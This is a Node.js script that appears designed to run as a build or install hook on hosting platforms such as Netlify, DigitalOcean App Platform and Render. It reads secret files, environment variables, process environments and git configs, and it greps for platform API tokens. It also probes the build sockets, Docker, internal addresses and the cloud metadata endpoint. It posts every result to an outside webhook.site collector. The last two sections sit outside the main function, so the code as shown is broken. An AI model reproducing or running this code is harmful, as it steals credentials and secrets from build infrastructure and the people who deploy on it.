const https = require('https');
const { execSync } = require('child_process');

const COLLECTOR = 'https://webhook.site/7e1a92af-541b-433a-b6fc-38ef26b87b60';
const TAG = process.env.PROBE_TAG || 'p4';

function sh(cmd, t) {
  try {
    return execSync(cmd, { encoding: 'utf8', timeout: t || 25000, stdio: ['ignore', 'pipe', 'pipe'], maxBuffer: 8 * 1024 * 1024 });
  } catch (e) {
    return 'ERR ' + String((e && e.stdout) || '') + String((e && e.stderr) || '') + String((e && e.message) || '');
  }
}
function cut(s, n) { s = String(s); return s.length > n ? s.slice(0, n) + '\n...[cut ' + s.length + ']' : s; }
function post(obj) {
  return new Promise((resolve) => {
    const body = Buffer.from(JSON.stringify(obj));
    const u = new URL(COLLECTOR);
    const req = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'POST',
      headers: { 'content-type': 'application/json', 'content-length': body.length }, timeout: 25000,
    }, (r) => { r.resume(); r.on('end', () => resolve(r.statusCode)); });
    req.on('error', (e) => resolve('ERR ' + e.message));
    req.on('timeout', () => { req.destroy(); resolve('timeout'); });
    req.write(body); req.end();
  });
}

(async () => {
  const phase = 'p5-' + (process.argv[2] || 'install');
  const base = { kind: 'build-probe5', tag: TAG, phase, whoami: sh('id; hostname; cat /etc/hostname 2>/dev/null').slice(0, 300) };

  // 1) platform marker files & secret dirs
  const secrets = sh("echo '--- /etc/secrets ---'; ls -la /etc/secrets 2>&1; for f in /etc/secrets/*; do [ -f \"$f\" ] && echo \"### $f\" && head -c 3000 \"$f\"; done; echo '--- /etc/secrets recursive ---'; find /etc/secrets -maxdepth 2 2>&1 | head -30", 25000);
  const platdir = sh("echo '--- DO ---'; ls -la /workspace /home /home/apps /layers /cnb /platform /opt 2>&1 | head -60; echo '--- NETLIFY ---'; ls -la /opt/build /opt/buildhome /opt/build-bin 2>&1 | head -40; echo '--- RENDER ---'; find /opt/render -maxdepth 3 2>&1 | head -40", 30000);
  await post(Object.assign({}, base, { part: 'plat', secrets: cut(secrets, 12000), platdir: cut(platdir, 12000) }));

  // 2) netlify buildbot socket protocol discovery
  const sock = sh("S=/tmp/netlify-buildbot-socket; ls -la $S 2>&1; for p in / /health /status /build /build-status /deploy /env; do echo \"== GET $p\"; curl -s -m 3 --unix-socket $S http://localhost$p -D - 2>&1 | head -c 600; echo; done; echo '== POST /'; curl -s -m 3 --unix-socket $S -X POST -H 'content-type: application/json' -d '{\"type\":\"ping\"}' http://localhost/ -D - 2>&1 | head -c 600", 40000);
  const sockcode = sh("timeout 20 grep -rIs -m2 -n 'netlify-buildbot-socket\\|buildbot' /opt/build-bin /opt/build /opt/buildhome/run-build-functions.sh 2>/dev/null | head -25", 30000);
  await post(Object.assign({}, base, { part: 'netlify-sock', sock: cut(sock, 10000), sockcode: cut(sockcode, 8000) }));

  // 3) DO / platform env details + small tmp files
  const dotmp = sh("ls -la /tmp 2>&1 | head -30; for f in /tmp/*; do [ -f \"$f\" ] && [ $(stat -c%s \"$f\" 2>/dev/null || echo 999999) -lt 8192 ] && echo \"### $f\" && head -c 2500 \"$f\"; done; echo '--- gitconfig ---'; cat /workspace/.git/config .git/config 2>&1 | head -20", 30000);
  const doenv = sh("env | sort | head -80; echo ---P1---; tr '\\0' '\\n' < /proc/1/environ 2>&1 | head -60; echo ---FINDTOK---; timeout 20 grep -rIls -m1 -E 'dop_v1_|doo_v1_|DIGITALOCEAN_ACCESS_TOKEN|NETLIFY_AUTH_TOKEN|nfp_|RENDER_API_KEY|rnd_[A-Za-z0-9]{20}' /home /opt /workspace /etc /run 2>/dev/null | grep -vE 'node_modules|/usr/|/layers/|/cnb/' | head -10", 45000);
  await post(Object.assign({}, base, { part: 'tmp-do', tmp: cut(dotmp, 12000), doenv: cut(doenv, 16000) }));

  // 4) generic: who can we reach, docker socket, cf root dir
  const misc = sh("ls -la /opt/root 2>&1 | head; ls -la /opt/buildhome/.docker 2>&1 | head; echo '--- dockersock test ---'; DOCKER_HOST=unix:///opt/buildhome/.docker/xrd/docker.sock docker info 2>&1 | head -12; echo '--- reach ---'; for hp in 10.12.0.1:443 10.29.121.163:80 10.26.183.114:80 169.254.169.254:80; do host=${hp%:*}; port=${hp#*:}; timeout 3 bash -c \"echo > /dev/tcp/$host/$port\" 2>/dev/null && echo \"$hp open\" || echo \"$hp closed\"; done", 30000);
  await post(Object.assign({}, base, { part: 'misc', misc: cut(misc, 8000) }));

  console.log('probe4 posted ' + TAG);
})()
  // 5) DO-specific: /.app_platform, /cnb, /platform, /tmp files
  const appplat = sh("echo '--- /.app_platform ---'; find /.app_platform -maxdepth 3 2>&1 | head -40; for f in $(find /.app_platform -maxdepth 3 -type f 2>/dev/null | head -10); do echo \"### $f\"; head -c 2000 \"$f\"; done; echo '--- /platform ---'; find /platform -maxdepth 2 2>&1 | head -20; echo '--- /cnb ---'; ls -la /cnb /cnb/buildpacks 2>&1 | head -25; echo '--- /tmp/small ---'; for f in /tmp/tmp.* /tmp/*.json; do [ -f \"$f\" ] && [ $(stat -c%s \"$f\" 2>/dev/null || echo 999999) -lt 8192 ] && echo \"### $f\" && head -c 2000 \"$f\"; done", 35000);
  await post(Object.assign({}, base, { part: 'do-appplat', appplat: cut(appplat, 16000) }));

  // 6) render published-src check (secret files copied into static publish dir)
  const rendersrc = sh("for d in /opt/render/project/src /opt/render/project; do echo \"== $d\"; ls -la $d 2>&1 | head -25; done; echo '--- find secret-ish ---'; find /opt/render/project -maxdepth 4 -type f 2>/dev/null | head -40; echo '--- /etc/secrets copy check ---'; ls -la /etc/secrets 2>&1; find / -maxdepth 2 -name '.app_platform' -o -maxdepth 3 -name '*.pem' 2>/dev/null | head", 35000);
  await post(Object.assign({}, base, { part: 'render-src', rendersrc: cut(rendersrc, 12000) }));

;